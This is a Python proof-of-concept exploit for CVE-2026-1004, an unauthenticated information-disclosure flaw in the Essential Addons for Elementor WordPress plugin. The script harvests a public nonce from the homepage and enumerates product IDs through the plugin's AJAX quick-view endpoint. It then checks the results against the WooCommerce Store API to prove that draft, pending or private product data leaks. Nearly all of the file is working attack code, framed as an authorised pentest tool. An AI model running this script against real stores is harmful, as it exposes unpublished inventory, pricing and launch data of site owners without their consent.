#!/usr/bin/env python3
"""eael_quickview_poc.py — proof-of-exploit for CVE-2026-1004, the Essential
Addons for Elementor (Lite) UNAUTHENTICATED product-data disclosure.

This is an INFORMATION-DISCLOSURE bug (CWE-862, missing authorization, CVSS 5.3),
NOT a privilege escalation and NOT a path to a webshell — so it deliberately
lives OUTSIDE the pentest-agent exploit pipeline (wp/recipes.py). It plants
nothing on the target; it only proves that restricted product data leaks. Use it
to attach hard evidence to a report.

Root cause (fixed in 6.5.6, commit 4e43db0): the AJAX handler
eael_product_quickview_popup() in includes/Traits/Ajax_Handler.php is registered
on BOTH wp_ajax_ and wp_ajax_nopriv_eael_product_quickview_popup, reads
product_id straight off $_POST, and renders the WooCommerce quick-view for it
with no is_visible()/post_status/current_user_can('edit_post') check. So an
unauthenticated request can retrieve quick-view data for products in draft,
pending or private status — content that should be invisible to the public.

The only gate is check_ajax_referer('essential-addons-elementor', 'security'):
a nonce for action 'essential-addons-elementor', which EA localizes in plaintext
on the homepage as `var localize = {..."nonce":"..."}`. We harvest it with the
same engine the CVE-2023-32243 recipe uses (wp.exploit._harvest_js_nonce) and
send it as the POST field 'security'.

Proof strategy: the leak is only a *finding* when a product that is NOT publicly
visible comes back with data. So we build the baseline of publicly-visible
product IDs from the WooCommerce Store API (unauth, published-only), then probe
a range of product_id integers through the vulnerable endpoint. Any id that
returns quick-view data but is absent from the public catalog is a confirmed
leak of a non-public product.

AUTHORISED / clone use ONLY.

  python3 eael_quickview_poc.py https://site.tld              # auto: diff vs public catalog
  python3 eael_quickview_poc.py https://site.tld --max 500    # probe ids 1..500
  python3 eael_quickview_poc.py https://site.tld --product-id 42   # prove one known-draft id
  python3 eael_quickview_poc.py https://site.tld --nonce <n> # skip harvest, use this nonce
  python3 eael_quickview_poc.py --self-test                  # offline: verify leak-detection logic
"""
import argparse
import re
import sys

AJAX = "/wp-admin/admin-ajax.php"
ACTION = "eael_product_quickview_popup"
# Store API returns ONLY published, catalog-visible products to the public — the
# exact baseline a non-public leak must fall outside of.
STORE_API = ["/wp-json/wc/store/v1/products", "/wp-json/wc/store/products"]

# Markers that distinguish a real rendered quick-view from an empty/false render
# (wc_get_product() on a bad id yields no product, so the markup comes back tiny).
_PRODUCT_MARKERS = ("product_title", "add_to_cart", "eael-product",
                    "single_add_to_cart", "woocommerce-Price", "summary")


def looks_like_product(data):
    """True if the AJAX 'data' payload is a genuinely-rendered quick-view rather
    than the near-empty markup a nonexistent product_id produces."""
    if not isinstance(data, str):
        return False
    body = data.strip()
    if len(body) < 200:
        return False
    return any(m in body for m in _PRODUCT_MARKERS)


def extract_title(data):
    """Best-effort product name out of the quick-view HTML, for the report."""
    for pat in (r'class="product_title[^"]*"[^>]*>(.*?)<',
                r'<h[12][^>]*>(.*?)</h[12]>',
                r'"name"\s*:\s*"([^"]{1,120})"'):
        m = re.search(pat, data, re.DOTALL | re.IGNORECASE)
        if m:
            t = re.sub(r"\s+", " ", m.group(1)).strip()
            if t:
                return t[:120]
    return ""


def public_product_ids(http, base, timeout):
    """IDs the public is *allowed* to see (published + catalog-visible), via the
    unauth WooCommerce Store API. Returns a set; empty if the API is absent."""
    ids = set()
    for path in STORE_API:
        try:
            r = http.get(base + path, params={"per_page": 100}, timeout=timeout)
            items = r.json()
        except Exception:
            continue
        if isinstance(items, list) and items:
            for it in items:
                if isinstance(it, dict) and it.get("id") is not None:
                    ids.add(int(it["id"]))
            if ids:
                break
    return ids


def probe(http, base, nonce, product_id, timeout):
    """One unauth quick-view request. Returns the leaked HTML string, or ''."""
    try:
        r = http.post(base + AJAX,
                      data={"action": ACTION, "security": nonce,
                            "product_id": product_id, "widget_id": "", "page_id": ""},
                      timeout=timeout)
        j = r.json()
    except Exception:
        return ""
    if not (isinstance(j, dict) and j.get("success")):
        return ""
    data = j.get("data")
    return data if looks_like_product(data) else ""


def run(base, args):
    from http_client import HttpClient
    from wp.exploit import _harvest_js_nonce

    base = base.rstrip("/")
    http = HttpClient(insecure=True, timeout=args.timeout)

    print(f"[*] target : {base}")
    print("[*] step 1 : harvesting the 'essential-addons-elementor' nonce off the homepage…")
    nonce = args.nonce or _harvest_js_nonce(http, base + "/", "nonce")
    if not nonce:
        print("  ✗  no nonce found. EA may be inactive here, or the homepage doesn't")
        print("     localize it — try another page's URL, or pass --nonce <value>.")
        return 1
    print(f"            nonce = {nonce}")

    # Baseline: what the public is legitimately allowed to see.
    public = set() if args.product_id else public_product_ids(http, base, args.timeout)
    if args.product_id:
        print(f"[*] step 2 : probing the single product_id {args.product_id}")
        ids = [args.product_id]
    else:
        print(f"[*] step 2 : {len(public)} public product(s) via Store API; "
              f"probing product_id 1..{args.max} for non-public leaks")
        ids = range(1, args.max + 1)

    leaks, seen = [], 0
    for pid in ids:
        data = probe(http, base, nonce, pid, args.timeout)
        if not data:
            continue
        seen += 1
        if pid in public:
            continue  # published & catalog-visible: returning it is expected, not a leak
        leaks.append((pid, data))

    if not args.product_id:
        print(f"            {seen} product_id(s) returned data; "
              f"{len(leaks)} of them are NOT in the public catalog")

    if not leaks:
        print("\n  ✗  no non-public product data leaked.")
        if args.product_id:
            print("     That id returned no quick-view (nonexistent, or truly public).")
        elif not public:
            print("     NOTE: Store API returned no baseline, so 'non-public' couldn't be")
            print("     computed — every returned id was treated as possibly-public. Re-run")
            print("     with --product-id <a draft/pending id> to prove a specific leak.")
        else:
            print("     Endpoint reachable but no draft/pending/private product surfaced")
            print(f"     in ids 1..{args.max}. Widen with --max, or target a known id.")
        return 1

    print("\n  ✅  HARD PROOF — unauthenticated disclosure of NON-PUBLIC product data")
    print(  "  ──────────────────────────────────────────────────────────────────")
    for pid, data in leaks:
        title = extract_title(data)
        label = f" — “{title}”" if title else ""
        print(f"  • product_id {pid}{label}  ({len(data)} bytes of quick-view HTML)")
    ev_id, ev_data = leaks[0]
    snippet = re.sub(r"\s+", " ", ev_data.strip())[:240]
    print(f"\n  evidence (product_id {ev_id}, first 240 chars of leaked markup):")
    print(f"    {snippet}…")
    print("\n  impact  : an unauthenticated attacker retrieves quick-view data (name,")
    print("            price, description, images) for products the store has NOT")
    print("            published — draft/pending/private inventory, pricing, launches.")
    print("  cleanup : none — this is a READ-only disclosure; nothing was written.")
    print("  fix     : update Essential Addons for Elementor to 6.5.6+.")
    return 0


def _self_test():
    # looks_like_product: real render vs empty/nonexistent-id render
    real = '<div class="eael-product-quick-view"><h1 class="product_title">Secret</h1>' + "x" * 300 + "</div>"
    assert looks_like_product(real), "real quick-view should be detected"
    assert not looks_like_product("<div></div>"), "empty markup must not count"
    assert not looks_like_product(""), "empty string must not count"
    assert not looks_like_product("x" * 500), "long-but-marker-less blob must not count"
    # extract_title
    assert extract_title(real) == "Secret", extract_title(real)
    assert extract_title('{"name":"Draft Widget"}') == "Draft Widget"
    assert extract_title("no title here" * 30) == ""
    print("self-test OK: leak-detection + title-extraction behave as expected")
    return 0


def main():
    ap = argparse.ArgumentParser(
        description="EA for Elementor unauth product-disclosure PoC "
                    "(CVE-2026-1004; authorized/clone use only)")
    ap.add_argument("target", nargs="?", help="https://site.tld")
    ap.add_argument("--product-id", type=int, help="prove a single known non-public id")
    ap.add_argument("--max", type=int, default=300, help="probe product_id 1..MAX (default 300)")
    ap.add_argument("--nonce", help="use this nonce instead of harvesting one")
    ap.add_argument("--timeout", type=int, default=15, help="per-request timeout (s)")
    ap.add_argument("--self-test", action="store_true", help="offline logic check, no network")
    a = ap.parse_args()

    if a.self_test:
        return _self_test()
    if not a.target:
        ap.error("target is required (or use --self-test)")
    return run(a.target, a)


if __name__ == "__main__":
    sys.exit(main())
